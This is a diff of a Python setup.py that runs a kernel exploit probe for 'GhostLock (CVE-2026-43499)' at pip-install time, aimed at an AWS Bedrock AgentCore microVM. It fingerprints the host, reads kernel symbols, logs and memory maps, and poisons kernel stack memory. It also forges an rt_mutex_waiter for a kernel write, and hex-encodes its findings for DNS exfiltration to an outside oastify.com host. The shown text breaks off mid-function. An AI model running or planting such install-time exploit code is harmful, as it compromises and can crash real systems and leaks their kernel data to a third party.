@@ -1,844 +1,994 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ghostlock_setup.py -- pip setup.py probing GhostLock (CVE-2026-43499),
-tuned for an AWS Bedrock AgentCore Runtime microVM (arm64, amzn2023).
+setup.py -- GhostLock (CVE-2026-43499) pip-install-time probe.
 
-  phase A   poison via PR_SET_MM_MAP's on-stack user_auxv[]. Non-canonical
-            qwords: no kernel address needed, PAN-proof.
-            WEDGE = dangling pi_blocked_on dereferenced = vulnerable.
-            CLEAN = pi_blocked_on was NULL = patched.
-  phase A2  same poison via pselect6's on-stack fd_set scratch (different frame
-            depth; also the fallback when CONFIG_CHECKPOINT_RESTORE is off).
-  phase B   forge a fake rt_mutex_waiter whose rb node collapses rb_erase to a
-            single 8-byte store. Only meaningful on a *vulnerable* kernel,
-            because on a fixed one pi_blocked_on is already NULL.
+Fingerprints the environment, then tries to walk the dangling
+task->pi_blocked_on left behind by the incomplete remove_waiter() fix.
 
-CHECKPOINTED REPORTING.  This box has panic_on_oops=1 and panic=5, so a fault
-reboots the microVM and kills setup.py. Each destructive step is therefore
-preceded by its own short DNS burst, so the last burst received tells you
-exactly how far the run got and the missing next burst is the signal:
+Wire grammar (decoder-compatible, unchanged):
+    <idx:03d>-<chunk:03d>-<hex>      idx 0 = final, 800/820/840 = checkpoints
+    end-<n:03d>
 
-    glk4        idx 800   stage=START      (gate only)
-    glk4/A      idx 820   stage=AFTER_A    (arrives => phase A did not fault)
-    glk4/A2     idx 840   stage=AFTER_A2
-    glk4/DONE   idx 000   final verdict
-
-  START only                       -> the reclaim faulted on the first drive
-                                      => VULNERABLE (when vstat says so)
-  AFTER_A but not AFTER_A2         -> A clean, A2 faulted => VULNERABLE
-  START..DONE all present          -> no fault at all => patched
-
-TIMEOUTS ARE HIERARCHICAL: every internal wait is shorter than the child's
-lifetime, so a staging failure always reports instead of going silent.
+Child pipe stage bytes (see _parse):
+    1          fork ok
+    2 +4       fvar, asz/8, nfd/8, psel_size
+    3 +8       w_tid, w_lock_rc        (w_lock != 0 -> W never owned f_x)
+    4 +4       requeue rc              (-35 == -EDEADLK, cycle fired)
+    6 +4       waiter return rc        (MISS == W never left the wait)
+    5 +4       reclaim rc
+    7          about to drive
+    9 +4       drive rc                (absent == drive never returned)
+    E          unhandled exception
 """
 
-import ctypes
-import mmap
 import os
-import re
-import signal
-import socket
-import struct
-import sys
-import threading
 import time
-from concurrent.futures import ThreadPoolExecutor
+import struct
+import socket
+import select
+import mmap
+import ctypes
 
-# --------------------------------------------------------------------------
-# transport
-# --------------------------------------------------------------------------
-_ENDPOINT = "6gnltn2z9z06ygz7lbev8a9yrpxjlc91.oastify.com"
-_LABEL_CHUNK = 52          # 3+1+3+1+52 = 60 octets, under the 63 limit
-_PASSES = 4
-_GAP = 0.5
-_WORKERS = 12
+try:
+    import resource
+except Exception:
+    resource = None
 
-_BUDGET = 30.0
-_CHILD_TIMEOUT = 0.80      # child lifetime
-_WAIT_STAGE = 0.50         # mover: staging handshake
-_WAIT_RECLAIM = 0.55       # mover: waiter reclaim
-_MAX_ATTEMPTS = 36
 
-_CKPT = (800, 820, 840)    # checkpoint index bases; final report uses 0
+# ---------------------------------------------------------------------------
+# tunables
+# ---------------------------------------------------------------------------
+OAST = os.environ.get("GLK_OAST", "xtuc6efqmqdxb7cyy2rml1mp4gaby6mv.oastify.com")
+RUN = os.environ.get("GLK_RUN", "glk5")
+CHUNK = 52
+T_CHILD = 1.90
+T_GRACE = 0.35
+T_DRIVE = 0.60
 
-# --------------------------------------------------------------------------
-# ABI
-# --------------------------------------------------------------------------
+SKIP_A = bool(os.environ.get("GLK_SKIP_A"))
+SKIP_A2 = bool(os.environ.get("GLK_SKIP_A2"))
+SKIP_B = bool(os.environ.get("GLK_SKIP_B"))
+
+AUXV_TRY = (368, 352, 344, 336, 328, 320, 256, 192, 128, 64)
+
+SENT = None
+MISS = 0x7ffffffe
+
+PSEL_NFDS = 320
+FD_PAD = 330
+SIGURG = 23
+
 FUTEX_WAKE = 1
 FUTEX_LOCK_PI = 6
 FUTEX_WAIT_REQUEUE_PI = 11
 FUTEX_CMP_REQUEUE_PI = 12
-FUTEX_PRIVATE_FLAG = 128
-FUTEX_WAITERS = 0x80000000
-EDEADLK = 35
+FUTEX_PRIVATE = 128
 
 PR_SET_MM = 35
 PR_SET_MM_MAP = 14
 MM_MAP_SIZE = 104
-AUXV_BYTES = 46 * 8
-_MM_KEYS = ("start_code", "end_code", "start_data", "end_data", "start_brk",
-            "brk", "start_stack", "arg_start", "arg_end", "env_start", "env_end")
 
-SCHED_OTHER = 0
-SCHED_BATCH = 3
+SYSLOG_READ_ALL = 3
+SYSLOG_SIZE_BUFFER = 10
 
-SYSLOG_ACTION_READ_ALL = 3
-SYSLOG_ACTION_SIZE_BUFFER = 10
+SCHED_NORMAL, SCHED_FIFO, SCHED_RR = 0, 1, 2
+SCHED_BATCH = getattr(os, "SCHED_BATCH", 3)
 
-POISON = 0xdeadbee11c518f58          # non-canonical
-KIMAGE_VADDR = 0xffff800008000000    # arm64 VA_BITS=48
-PAGE_OFFSET = 0xffff000000000000     # arm64 linear map base
+EINVAL, ESRCH = 22, 3
 
-_MACH = os.uname()[4].lower()
-#                 futex prctl sched pselect6 syslog
-_SYS = {"aarch64": (98, 167, 119, 72, 116), "arm64": (98, 167, 119, 72, 116),
-        "riscv64": (98, 167, 119, 72, 116), "x86_64": (202, 157, 144, 270, 103),
-        "amd64": (202, 157, 144, 270, 103), "i386": (240, 172, 146, 309, 103),
-        "armv7l": (240, 172, 119, 72, 103)}
-(SYS_FUTEX, SYS_PRCTL, SYS_SCHED, SYS_PSELECT6, SYS_SYSLOG) = _SYS.get(
-    _MACH, (98, 167, 119, 72, 116))
 
+# ---------------------------------------------------------------------------
+# libc -- syscall numbers are PROBED, never trusted
+# ---------------------------------------------------------------------------
 _libc = ctypes.CDLL(None, use_errno=True)
 _libc.syscall.restype = ctypes.c_long
-_L, _V, _U, _I = ctypes.c_long, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_int
+_libc.prctl.restype = ctypes.c_int
+_libc.prctl.argtypes = [ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong,
+                        ctypes.c_ulong, ctypes.c_ulong]
+_ul = ctypes.c_ulong
 
-# --------------------------------------------------------------------------
-# stderr silence
-# --------------------------------------------------------------------------
-class _BS(object):
-    def write(self, b): return len(b)
-    def flush(self): pass
-    def fileno(self): return 2
+_MACH = os.uname().machine
+_X86 = _MACH in ("x86_64", "amd64")
+NR = dict(futex=202 if _X86 else 98,
+          pselect6=270 if _X86 else 72,
+          tgkill=234 if _X86 else 131,
+          gettid=186 if _X86 else 178,
+          syslog=103 if _X86 else 116)
 
-class _S(object):
-    buffer = _BS()
-    def write(self, s): return len(s)
-    def flush(self): pass
-    def isatty(self): return False
-    def fileno(self): return 2
-    def writable(self): return True
+_RBRK = [0]
+_KN = {}
 
-def _quiet():
-    st = {}
+
+def _sys(nr, *a):
+    args = [_ul(int(x) & 0xFFFFFFFFFFFFFFFF) for x in a]
+    ctypes.set_errno(0)
+    r = _libc.syscall(_ul(nr), *args)
+    e = ctypes.get_errno()
+    return r, e
+
+
+def _rc(nr, *a):
+    r, e = _sys(nr, *a)
+    if r == -1:
+        return -e if e else -1
+    return r
+
+
+def _yield():
+    time.sleep(0)
+
+
+def _rd32(m):
+    return struct.unpack_from("<I", m, 0)[0]
+
+
+def _word():
+    """(mmap, address).  TWO values -- keep the mmap, it owns the page."""
+    m = mmap.mmap(-1, 0x1000)
+    m[0:4] = b"\x00\x00\x00\x00"
+    return m, ctypes.addressof(ctypes.c_uint32.from_buffer(m))
+
+
+def _real_brk():
+    """glibc __curbrk, cached before any PR_SET_MM_MAP can poison it."""
+    if not _RBRK[0]:
+        try:
+            _libc.sbrk.restype = ctypes.c_void_p
+            _libc.sbrk.argtypes = [ctypes.c_long]
+            v = _libc.sbrk(0) or 0
+            if v and v != 0xFFFFFFFFFFFFFFFF:
+                _RBRK[0] = v
+        except Exception:
+            pass
+    return _RBRK[0]
+
+
+def _futex_nr():
+    """Two conditions: unknown op -> -EINVAL ; wake on empty bucket -> 0.
+    A single == 0 test also passes for nanosleep on a zeroed timespec."""
+    if not _KN.get("futex"):
+        m, a = _word()
+        for nr in (NR["futex"], 98, 95, 202):
+            r1, _e = _sys(nr, a, 0x7FFFFFFF, 0, 0, 0, 0)
+            r2, _e = _sys(nr, a, FUTEX_WAKE | FUTEX_PRIVATE, 1, 0, 0, 0)
+            if r1 == -EINVAL and r2 == 0:
+                _KN["futex"] = nr
+                break
+        _KN.setdefault("futex", NR["futex"])
+    return _KN["futex"]
+
+
+def _pselect_nr():
+    """nfds=0 -> 0 ; nfds=-1 -> -EINVAL."""
+    if not _KN.get("psel"):
+        tv = ctypes.create_string_buffer(b"\0" * 16, 16)
+        ta = ctypes.addressof(tv)
+        for nr in (NR["pselect6"], 72, 270):
+            r1, _e = _sys(nr, 0, 0, 0, 0, ta, 0)
+            r2, _e = _sys(nr, -1, 0, 0, 0, ta, 0)
+            if r1 == 0 and r2 == -EINVAL:
+                _KN["psel"] = nr
+                break
+        _KN.setdefault("psel", NR["pselect6"])
+    return _KN["psel"]
+
+
+def _tgkill_nr():
+    """valid tid -> 0 ; bogus tid -> -ESRCH."""
+    if not _KN.get("tgkill"):
+        pid = os.getpid()
+        for nr in (NR["tgkill"], 131, 234):
+            r1, _e = _sys(nr, pid, pid, 0)
+            r2, _e = _sys(nr, pid, 0x7FFFFFFF, 0)
+            if r1 == 0 and r2 == -ESRCH:
+                _KN["tgkill"] = nr
+                break
+        _KN.setdefault("tgkill", NR["tgkill"])
+    return _KN["tgkill"]
+
+
+def _syslog_nr():
+    """SIZE_BUFFER: plausible, stable, positive."""
+    if not _KN.get("syslog"):
+        for nr in (NR["syslog"], 116, 113, 103):
+            r1, _e = _sys(nr, SYSLOG_SIZE_BUFFER, 0, 0)
+            if 4096 <= r1 <= 0x4000000:
+                r2, _e = _sys(nr, SYSLOG_SIZE_BUFFER, 0, 0)
+                if r1 == r2:
+                    _KN["syslog"] = nr
+                    break
+        _KN.setdefault("syslog", NR["syslog"])
+    return _KN["syslog"]
+
+
+def _gettid():
     try:
-        sys.stderr.flush()
+        _libc.gettid.restype = ctypes.c_int
+        t = _libc.gettid()
+        if t > 0:
+            return t
     except Exception:
         pass
+    return _rc(NR["gettid"])
+
+
+def _tgkill(pid, tid, sig):
+    return _rc(_tgkill_nr(), pid, tid, sig)
+
+
+def _lock_pi(a):
+    return _rc(_futex_nr(), a, FUTEX_LOCK_PI | FUTEX_PRIVATE, 0, 0, 0, 0)
+
+
+def _requeue_pi(a1, a2, v3):
+    return _rc(_futex_nr(), a1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE, 1, 1, a2, v3)
+
+
+def _wake(a):
+    return _rc(_futex_nr(), a, FUTEX_WAKE | FUTEX_PRIVATE, 1, 0, 0, 0)
+
+
+# ---------------------------------------------------------------------------
+# prctl_mm_map
+# ---------------------------------------------------------------------------
+def _read_maps():
+    rows = []
     try:
-        st["s"] = sys.stderr
-        st["fd"] = os.dup(2)
-        dn = os.open(os.devnull, os.O_WRONLY)
-        os.dup2(dn, 2)
-        os.close(dn)
-        sys.stderr = _S()
+        with open("/proc/self/maps") as fh:
+            for ln in fh:
+                p = ln.split()
+                if len(p) < 6:
+                    continue
+                lo, hi = p[0].split("-")
+                rows.append((int(lo, 16), int(hi, 16), p[1], p[5]))
     except Exception:
         pass
-    return st
+    return rows
 
-def _loud(st):
+
+def _mm_fields(variant):
+    """Least-destructive first.  mm->brk = stack_start makes the next sbrk()
+    take sys_brk()'s shrink branch and do_munmap(real+inc, stack_start),
+    deleting libc, ld.so and every mmap'd arena.  Every field is a mapping
+    *start* so validate_prctl_map_addr()'s find_vma(addr) / vm_start > addr
+    test cannot reject the map."""
+    rows = _read_maps()
+
+    def first(pred):
+        for lo, _hi, perms, name in rows:
+            if pred(perms, name):
+                return lo
+        return 0
+
+    stack = first(lambda p, n: "[stack]" in n)
+    if not stack:
+        stack = max((r[0] for r in rows), default=0x7ffff0000000)
+    data = first(lambda p, n: "w" in p and "[" not in n) or stack
+    code = first(lambda p, n: "x" in p and "[" not in n) or data
+    heap = first(lambda p, n: "[heap]" in n) or data
+    heap_end = 0
+    for _lo, hi, _p, name in rows:
+        if "[heap]" in name:
+            heap_end = hi
+            break
+    rb = _real_brk() or heap_end
+
+    if variant in ("stackall", "dataall"):
+        A = stack if variant == "stackall" else data
+        return dict(code=(A, A), data=(A, A), brk=(A, A), stack=A,
+                    arg=(A, A), env=(A, A))
+
+    if variant == "nat" and rb and rb > heap:
+        brk = rb
+    elif variant == "natm1" and rb and rb - 0x1000 > heap:
+        brk = rb - 0x1000
+    else:
+        brk = heap
+    return dict(code=(code, code), data=(data, data), brk=(heap, brk),
+                stack=stack, arg=(stack, stack), env=(stack, stack))
+
+
+def _pack(f, auxv, auxv_size):
+    return struct.pack(
+        "<12QII",
+        f["code"][0], f["code"][1], f["data"][0], f["data"][1],
+        f["brk"][0], f["brk"][1], f["stack"],
+        f["arg"][0], f["arg"][1], f["env"][0], f["env"][1],
+        auxv, auxv_size, 0xFFFFFFFF)
+
+
+def _prctl_map(f, auxv_size, auxv_addr):
+    buf = ctypes.create_string_buffer(_pack(f, auxv_addr, auxv_size), MM_MAP_SIZE)
+    ctypes.set_errno(0)
+    r = _libc.prctl(PR_SET_MM, PR_SET_MM_MAP,
+                    ctypes.addressof(buf), MM_MAP_SIZE, 0)
+    e = ctypes.get_errno()
+    return -e if (r == -1 and e) else r
+
+
+def _pick_fields():
+    _real_brk()
+    for v in ("nat", "natm1", "natst", "stackall"):
+        f = _mm_fields(v)
+        if _prctl_map(f, 0, 0) == 0:
+            return f, v
+    return _mm_fields("natst"), "fallback"
+
+
+def _auxv_size(f):
+    buf = ctypes.create_string_buffer(0x800)
+    a = ctypes.addressof(buf)
+    for n in AUXV_TRY:
+        if _prctl_map(f, n, a) == 0:
+            return n
+    return 0
+
+
+def _forge(buf, off, lockv):
+    """Fake struct rt_mutex_waiter, 6.1 layout with rt_waiter_node:
+    tree@0 (rb_node 24 | prio 4 | deadline 8 == 40), pi_tree@40, task@80,
+    lock@88, ww_ctx@96.  Only `lock` is dereferenced directly; lockv=0 gives
+    a deterministic PAN fault at address 0 rather than a qspinlock spin."""
+    struct.pack_into("<i", buf, off + 0x18, 1)
+    struct.pack_into("<i", buf, off + 0x40 + 0x18, 1)
+    struct.pack_into("<Q", buf, off + 0x50, 0)
+    struct.pack_into("<Q", buf, off + 0x58, lockv)
+    struct.pack_into("<Q", buf, off + 0x60, 0)
+
+
+def _roundup_pow2(x):
+    p = 1
+    while p < x:
+        p <<= 1
+    return p
+
+
+def _psel_geometry():
+    """Predict core_sys_select()'s `size` from alloc_fdtable()'s own maths:
+    expand_fdtable(nr) -> alloc_fdtable(nr): nr/=128 ; nr=roundup_pow2(nr+1) ;
+    nr*=128.  A fresh files_struct is NR_OPEN_DEFAULT (64).  Exact for
+    need = 65/201/335."""
+    hi = 0
     try:
-        if st.get("s") is not None:
-            sys.stderr = st["s"]
-        if st.get("fd") is not None:
-            os.dup2(st["fd"], 2)
-            os.close(st["fd"])
+        for nm in os.listdir("/proc/self/fd"):
+            try:
+                v = int(nm)
+            except Exception:
+                continue
+            if v > hi:
+                hi = v
     except Exception:
         pass
+    need = hi + 1
+    if need <= 64:
+        mf = 64
+    else:
+        mf = _roundup_pow2(need // 128 + 1) * 128
+    n = min(PSEL_NFDS, mf)
+    size = ((n + 63) // 64) * 8
+    return n, size
 
-# --------------------------------------------------------------------------
-# syscalls (all return -errno, never glibc's -1)
-# --------------------------------------------------------------------------
-def _rc(r):
-    return -ctypes.get_errno() if r < 0 else r
 
-def _futex(uaddr, op, val=0, timeout=0, uaddr2=0, val3=0):
-    ctypes.set_errno(0)
-    return _rc(_libc.syscall(_L(SYS_FUTEX), _V(uaddr), _I(op), _U(val),
-                             _V(timeout), _V(uaddr2), _U(val3)))
-
-def _prctl_map(addr, size):
-    ctypes.set_errno(0)
-    return _rc(_libc.syscall(_L(SYS_PRCTL), _I(PR_SET_MM), _I(PR_SET_MM_MAP),
-                             _V(addr), _L(size), _L(0), _L(0)))
-
-def _sched(tid, policy):
-    p = ctypes.create_string_buffer(4)
-    struct.pack_into("<i", p, 0, 0)
-    ctypes.set_errno(0)
-    return _rc(_libc.syscall(_L(SYS_SCHED), _I(tid), _I(policy),
-                             _V(ctypes.addressof(p))))
-
-def _pselect6(n, a, b, c, tsp):
-    ctypes.set_errno(0)
-    return _rc(_libc.syscall(_L(SYS_PSELECT6), _I(n), _V(a), _V(b), _V(c),
-                             _V(tsp), _V(0)))
-
-def _syslog(action, buf, n):
-    ctypes.set_errno(0)
-    return _rc(_libc.syscall(_L(SYS_SYSLOG), _I(action), _V(buf), _L(n)))
-
-def _addr(buf):
-    return ctypes.addressof(ctypes.c_char.from_buffer(buf))
-
-def _g32(buf, off):
-    return struct.unpack_from("<I", buf, off)[0]
-
-def _s32(buf, off, val):
-    struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)
-
-def _s64(buf, off, val):
-    struct.pack_into("<Q", buf, off, val & 0xFFFFFFFFFFFFFFFF)
-
-def _yield(n):
-    """Cheap GIL release: clock_nanosleep(0) returns immediately, unlike
-    time.sleep(0.0001) which pays full wakeup latency."""
-    if (n & 31) == 31:
-        time.sleep(0)
-
-def _read_text(path, lim=1 << 22):
+# ---------------------------------------------------------------------------
+# environment
+# ---------------------------------------------------------------------------
+def _sf(name):
     try:
-        with open(path, "rb") as fh:
-            return fh.read(lim).decode("utf-8", "replace")
+        with open("/proc/self/status") as fh:
+            for ln in fh:
+                if ln.startswith(name + ":"):
+                    return ln.split(":", 1)[1].strip()
     except Exception:
-        return ""
+        pass
+    return "?"
 
-def _read_bin(path, lim):
+
+def _psys(name):
     try:
-        with open(path, "rb") as fh:
-            return fh.read(lim)
+        with open("/proc/sys/kernel/" + name) as fh:
+            return fh.read().strip()
+    except Exception:
+        return "?"
+
+
+def _dmesg():
+    try:
+        nr = _syslog_nr()
+        n = _rc(nr, SYSLOG_SIZE_BUFFER, 0, 0)
+        if n <= 0:
+            return b""
+        buf = ctypes.create_string_buffer(n + 1)
+        m = _rc(nr, SYSLOG_READ_ALL, ctypes.addressof(buf), n)
+        return buf.raw[:m] if m > 0 else b""
     except Exception:
         return b""
 
-# --------------------------------------------------------------------------
-# environment
-# --------------------------------------------------------------------------
-def _release():
-    t = _read_text("/proc/sys/kernel/osrelease", 256).strip()
-    if t:
-        return t
-    m = re.search(r"Linux version\s+(\S+)", _read_text("/proc/version", 512))
-    return m.group(1) if m else os.uname()[2]
 
-# (first fix, follow-up CVE-2026-53166 fix)
-_FIXED = {"6.1": (175, 177), "6.6": (140, 144), "6.12": (86, 88),
-          "6.18": (27, 36), "7.0": (4, 6)}
-
-def _vstatus(rel):
-    m = re.search(r"(?:^|[^\d])(\d+)\.(\d+)\.(\d+)", rel or "")
-    if not m:
-        return "UNPARSED"
-    v = tuple(int(x) for x in m.groups())
-    if v < (2, 6, 39):
-        return "NOT_AFFECTED"
-    if v >= (7, 1, 0):
-        return "FIXED"
-    k = "%d.%d" % (v[0], v[1])
-    if k not in _FIXED:
-        return "VULNERABLE_BY_BRANCH"
-    first, second = _FIXED[k]
-    if v[2] < first:
-        return "VULNERABLE"
-    if v[2] < second:
-        return "FIXED_NO_FOLLOWUP"
-    return "FIXED"
-
-def _klog():
-    try:
-        n = _syslog(SYSLOG_ACTION_SIZE_BUFFER, 0, 0)
-        if n <= 0 or n > (1 << 22):
-            n = 1 << 18
-        buf = ctypes.create_string_buffer(n)
-        r = _syslog(SYSLOG_ACTION_READ_ALL, ctypes.addressof(buf), n)
-        return buf.raw[:r].decode("utf-8", "replace") if r > 0 else ""
-    except Exception:
-        return ""
-
-def _panic_knobs():
-    return dict((k, _read_text("/proc/sys/kernel/" + k, 32).strip() or "?")
-                for k in ("panic", "panic_on_oops", "oops_limit"))
-
-_WANT = ("inet6_protos", "__bss_start", "__bss_stop", "_end", "core_pattern",
-         "_stext", "_etext")
-
-def _kallsyms():
-    """Returns (symbols, lines, zeroed). lines/zeroed are diagnostic: on this
-    class of box the file is present but every address prints as 0."""
-    out, lines, zeroed = {}, 0, True
-    for line in _read_text("/proc/kallsyms", 8 << 20).splitlines():
-        p = line.split()
-        if len(p) < 3:
-            continue
-        lines += 1
-        if p[2] not in _WANT:
-            continue
-        try:
-            a = int(p[0], 16)
-        except ValueError:
-            continue
-        if a:
-            zeroed = False
-            out.setdefault(p[2], a)
-    return out, lines, zeroed
-
-def _vmcoreinfo():
-    """SYMBOL(name)=0x... lines; real addresses even when kallsyms is masked."""
-    out = {}
-    txt = _read_text("/sys/kernel/vmcoreinfo", 1 << 16)
-    for m in re.finditer(r"SYMBOL\((\w+)\)=(0x[0-9a-fA-F]+)", txt):
-        try:
-            out[m.group(1)] = int(m.group(2), 16)
-        except ValueError:
-            pass
-    return out
-
-def _module_addrs():
+def _iomem():
     out = []
-    base = "/sys/module"
     try:
-        for mod in sorted(os.listdir(base))[:64]:
-            for sec in (".text", ".data", ".bss"):
-                p = os.path.join(base, mod, "sections", sec)
-                try:
-                    with open(p) as fh:
-                        v = int(fh.read().strip(), 16)
-                except Exception:
+        with open("/proc/iomem") as fh:
+            for ln in fh:
+                p = ln.split()
+                if len(p) < 3:
                     continue
-                if v and v not in out:
-                    out.append(v)
+                a, b = p[0].split("-")
+                lo, hi = int(a, 16), int(b, 16)
+                if lo == 0 and hi == 0:
+                    continue
+                out.append((lo, hi, " ".join(p[2:])))
     except Exception:
         pass
     return out
 
-def _iomem():
-    kern, code = [], None
-    for line in _read_text("/proc/iomem", 1 << 18).splitlines():
-        m = re.match(r"^([0-9a-fA-F]+)-([0-9a-fA-F]+)\s*:\s*(.*)$", line.strip())
-        if not m:
-            continue
-        lo, hi, name = int(m.group(1), 16), int(m.group(2), 16), m.group(3).strip()
-        if name.startswith("Kernel code") and code is None:
-            code = lo
-        if name.startswith("Kernel"):
-            kern.append((name, lo, hi))
-    return kern, code
 
-_LAY = re.compile(r"(?:^|\])\s*(\.text|\.rodata|\.data|\.bss|linear|memory|"
-                  r"modules|vmalloc)\s*:\s*(0x[0-9a-fA-F]+)\s*-\s*"
-                  r"(0x[0-9a-fA-F]+)", re.M)
-
-def _boot_layout(log):
-    out = {}
-    for m in _LAY.finditer(log or ""):
-        out.setdefault(m.group(1), (int(m.group(2), 16), int(m.group(3), 16)))
-    return out
-
-def _kcore_base():
-    h = _read_bin("/proc/kcore", 8192)
-    if len(h) < 64 or h[:4] != b"\x7fELF":
-        return None
+def _vstat(rel):
     try:
-        phoff = struct.unpack_from("<Q", h, 32)[0]
-        phentsize = struct.unpack_from("<H", h, 54)[0]
-        phnum = struct.unpack_from("<H", h, 56)[0]
+        maj, mi, pa = (int(x) for x in rel.split("-")[0].split(".")[:3])
     except Exception:
-        return None
-    for i in range(min(phnum, 64)):
-        o = phoff + i * phentsize
-        if o + 56 > len(h):
-            break
-        if struct.unpack_from("<I", h, o)[0] != 1:
-            continue
-        v = struct.unpack_from("<Q", h, o + 16)[0]
-        if v >= 0xffff000000000000:
-            return v
-    return None
+        return "UNKNOWN"
+    if maj == 6 and mi == 1:
+        return "VULNERABLE" if pa < 162 else "FIXED"
+    if maj == 6 and mi == 18:
+        return "VULNERABLE" if pa < 37 else "FIXED"
+    if maj >= 7:
+        return "FIXED"
+    if maj < 6:
+        return "VULNERABLE"
+    return "UNKNOWN"
 
-def _candidates(ks, vmi, mods, lay, kcore, iomem_kern, iomem_code):
-    """Writable-only: a plain store into .text takes a permission fault under
-    STRICT_KERNEL_RWX, and on this box a fault panics the VM."""
-    out = []
-    for src in (vmi, ks):                                   # exact if present
-        for s in ("_stext", "__bss_start", "_end", "inet6_protos", "core_pattern"):
-            if src.get(s):
-                out.append(src[s] & ~0xF)
-    for s in ("_stext",):
-        if (vmi.get(s) or ks.get(s)):
-            st = vmi.get(s) or ks[s]
-            out.append((st + 0x2000000) & ~0xF)             # likely .data/.bss
-    for name in (".bss", ".data"):                          # exact runtime VAs
-        if name in lay:
-            lo, hi = lay[name]
-            out.append((lo + max((hi - lo) // 2, 0)) & ~0xF)
-    if iomem_code is not None:                              # phys -> VA, VA fixed
-        for name, lo, hi in iomem_kern:
-            if name.startswith("Kernel bss") or name.startswith("Kernel data"):
-                out.append((KIMAGE_VADDR + (lo - iomem_code)) & ~0xF)
-    if kcore:
-        out.append((kcore + 0x2000000) & ~0xF)
-    out.extend(m & ~0xF for m in mods[:1])
-    lin = lay.get("linear") or lay.get("memory")
-    out.append(((lin[0] + 0x80000000) if lin else (PAGE_OFFSET + 0x80000000)) & ~0xF)
-    out.append((KIMAGE_VADDR + 0x2000000) & ~0xF)
-    ded = []
-    for c in out:
-        if c and c not in ded:
-            ded.append(c)
-    return ded[:4]
 
-def _mm_fields():
-    """Every address is a mapping *start*, so validate_prctl_map_addr's
-    find_vma()+vm_start check cannot reject -- a rejected map means no auxv copy,
-    which would be indistinguishable from a patched kernel."""
-    maps = []
-    for line in _read_text("/proc/self/maps", 1 << 20).splitlines():
-        parts = line.split(None, 5)
-        if len(parts) < 5:
-            continue
-        try:
-            lo_s, _, hi_s = parts[0].partition("-")
-            maps.append((int(lo_s, 16), int(hi_s, 16), parts[1],
-                         parts[5] if len(parts) > 5 else ""))
-        except ValueError:
-            continue
-    if not maps:
-        return dict((k, 0x1000) for k in _MM_KEYS)
+def _src():
+    ks, lines = 0, 0
+    try:
+        with open("/proc/kallsyms", "rb") as fh:
+            for ln in fh:
+                lines += 1
+                if ln[:16] != b"0000000000000000":
+                    ks += 1
+    except Exception:
+        pass
+    vmi = 0
+    try:
+        if os.path.getsize("/sys/kernel/vmcoreinfo") > 0:
+            vmi = 1
+    except Exception:
+        pass
+    mod = 0
+    try:
+        with open("/proc/modules") as fh:
+            mod = sum(1 for _ in fh)
+    except Exception:
+        pass
+    lay = 0
+    for ln in _dmesg().split(b"\n"):
+        if b".text" in ln or b"memory  :" in ln or b"Kernel code" in ln:
+            lay += 1
+    kcore = 0
+    try:
+        fd = os.open("/proc/kcore", os.O_RDONLY)
+        os.close(fd)
+        kcore = 1
+    except Exception:
+        pass
+    io = _iomem()
 
-    def pick(want, fb):
-        for lo, hi, perms, _n in maps:
-            if want in perms and hi - lo >= 0x1000:
-                return lo, hi
-        return fb
-
-    first = (maps[0][0], maps[0][1])
-    code, data = pick("x", first), pick("w", first)
-    stack = first
-    for lo, hi, _p, name in maps:
-        if name == "[stack]" and hi - lo >= 0x1000:
-            stack = (lo, hi)
-            break
-    return {"start_code": code[0], "end_code": code[1],
-            "start_data": data[0], "end_data": data[1],
-            "start_brk": data[0], "brk": data[0], "start_stack": stack[0],
-            "arg_start": first[0], "arg_end": first[1],
-            "env_start": first[0], "env_end": first[1]}
-
-def _pack_map(buf, auxv_addr, auxv_size, fields):
-    for i, k in enumerate(_MM_KEYS):
-        _s64(buf, i * 8, fields[k])
-    _s64(buf, 88, auxv_addr)
-    _s32(buf, 96, auxv_size)
-    _s32(buf, 100, 0xFFFFFFFF)
-
-# --------------------------------------------------------------------------
-# forged rt_mutex_waiter (both 6.1+ layouts pinned)
-# --------------------------------------------------------------------------
-def _forge_block(T):
-    V = T + 8
-    return ((0x00, 1), (0x08, 0), (0x10, V), (0x18, 1), (0x20, 0), (0x28, 0),
-            (0x30, T), (0x38, T), (0x40, 0), (0x48, 0), (0x50, T), (0x58, T),
-            (0x60, 0), (0x68, 0))
-
-# --------------------------------------------------------------------------
-# child
-# --------------------------------------------------------------------------
-_O_WAIT, _O_TGT, _O_CHAIN = 0x00, 0x08, 0x10
-_F_TID, _F_CHAIN, _F_TGT, _F_ARM, _F_STAGE, _F_RECLAIM, _F_DRIVE, _F_DONE, _F_RC = (
-    0x100, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x118, 0x11C, 0x120)
-
-def _child(wfd, mode, off, T, secs):
-    W = mmap.mmap(-1, 0x1000)
-    A = mmap.mmap(-1, 0x1000)
-    Mp = mmap.mmap(-1, 0x1000)
-    wa, aa, ma = _addr(W), _addr(A), _addr(Mp)
-
-    if mode.startswith("poison"):
-        for i in range(0, AUXV_BYTES, 8):
-            _s64(A, i, POISON + i)
+    if _X86:
+        cand = [0xffffffff81000000, 0xffff888000000000]
+        base = 0xffff888000000000
     else:
-        for i in range(0, AUXV_BYTES, 8):
-            _s64(A, i, 0)
-        for o, v in _forge_block(T):
-            if off + o + 8 <= AUXV_BYTES:
-                _s64(A, off + o, v)
-    _pack_map(Mp, aa, AUXV_BYTES, _mm_fields())
+        cand = [0xffff800008000000, 0xffff000080000000, 0xffff80000a000000]
+        base = 0xffff000000000000
+    for lo, _hi, nm in io:
+        if "RAM" in nm and lo < 0x100000000:
+            cand.append(base + lo)
 
-    sel_n = 320
-    sel_size = (sel_n // 64) * 8          # FDS_BYTES(320) == 40
+    seen, out = set(), []
+    for c in cand:
+        if c not in seen:
+            seen.add(c)
+            out.append(c)
 
-    def waiter():
+    return dict(ks=ks, lines=lines, zero=1 if (lines and not ks) else 0,
+                vmi=vmi, mod=mod, lay=lay, kcore=kcore, iomem=len(io), cand=out)
+
+
+# ---------------------------------------------------------------------------
+# reporting
+# ---------------------------------------------------------------------------
+class Report(object):
+    def __init__(self, tag):
+        self.tag = tag
+        self.lines = []
+
+    def add(self, k, v):
+        self.lines.append("%s=%s" % (k, v))
+
+    def flush(self, idx=0):
+        h = ("\n".join([self.tag] + self.lines) + "\n").encode("utf-8", "replace").hex()
